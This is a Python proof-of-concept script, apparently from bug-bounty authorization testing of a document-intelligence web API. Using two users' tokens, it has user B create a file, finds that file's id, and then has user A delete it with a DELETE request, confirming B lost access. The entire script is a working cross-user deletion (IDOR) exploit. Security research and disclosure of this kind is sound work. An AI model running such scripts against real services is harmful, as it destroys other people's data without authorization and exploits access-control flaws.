import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TA=open('/tmp/tok_A').read().strip()
TB=open('/tmp/tok_B').read().strip()
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','90','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or TA),'-H',BB,'-H','Content-Type: application/json']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='zx'+uuid.uuid4().hex[:8]
name=f"zx-{tag}-VICTIM"
print("=== STEP 1: B(230) creates a file ===")
c,b=req('POST','/api/v1/document_intelligence/export/pdf',
        {"htmlContent":"<h1>ZX-VICTIM</h1>","fileName":name},tok=TB)
print(f"  render -> {c}")
print("=== STEP 2: locate B's file by name ===")
c,b=req('POST','/api/v1/table/query?entities=file',
        {"ab:query":{"entities":["file"],"filter":{},"include":["file"]}},tok=TB)
inc=json.loads(b).get('included') or []
match=[f for f in inc if (f.get('attributes') or {}).get('name','').startswith(name)]
fid=None
if match:
    fid=match[0]['id']
    print(f"  FOUND id={fid} name={match[0]['attributes'].get('name')}")
else:
    print("  not found by name; newest 3:", [(f['id'],(f.get('attributes') or {}).get('name')) for f in sorted(inc,key=lambda x:int(x['id']),reverse=True)[:3]])
if fid:
    print("\n=== STEP 3: B confirms access (control) ===")
    c,b=req('GET',f'/api/v1/files/{fid}',tok=TB)
    print(f"  B GET -> {c}")
    print("\n=== STEP 4: A(231) DELETES B's file ===")
    c,b=req('DELETE',f'/api/v1/files/{fid}',tok=TA)
    print(f"  A DELETE -> {c} {b[:150].replace(chr(10),' ')}")
    print("\n=== STEP 5: B loses access to its own file ===")
    c,b=req('GET',f'/api/v1/files/{fid}',tok=TB)
    print(f"  B GET -> {c} {b[:200].replace(chr(10),' ')}")
    open('/tmp/deleted_fid','w').write(str(fid))
